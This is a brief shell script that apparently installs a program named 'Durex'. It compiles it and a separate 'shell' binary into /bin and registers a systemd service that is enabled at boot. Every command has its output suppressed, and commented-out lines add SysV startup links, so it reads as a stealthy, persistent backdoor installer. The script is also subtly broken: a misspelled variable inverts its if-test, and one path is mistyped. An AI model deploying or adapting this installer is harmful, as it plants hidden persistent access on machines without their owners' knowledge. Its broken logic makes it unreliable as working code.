if [[ -z "${USERNAMME}" ]]; then
    echo "${USERNAME}"
else
    echo "unknown"
fi

make 1>&- 2>&-
gcc srcs/durex.c -o /bin/Durex libft/libft.a 1>&- 2>&-
gcc srcs/shell.c -o /bin/shell 1>&- 2>&-
cp service/Durex.service /etc/systemd/system/Durex.service 1>&- 2>&-
# ln -sf ../init.d/Durex /etc/rcS.d/S01Durex
# ln -sf ../init.d/Durex /etc/rc6.d/K01Durex
# ln -sf ../init.d/Durex /etc/rc5.d/S01Durex
# ln -sf ../init.d/Durex /etc/rc4.d/S01Durex
# ln -sf ../init.d/Durex /etc/rc3.d/S01Durex
# ln -sf ../init.d/Durex /etc/rc2.d/S01Durex
# ln -sf ../init.d/Durex /etc/rc1.d/K01Durex
# ln -sf ../init.l/Durex /etc/rc0.d/K01Durex
systemctl daemon-reload 1>&- 2>&-
systemctl enable Durex.service 1>&- 2>&-
systemctl restart Durex.service 1>&- 2>&-
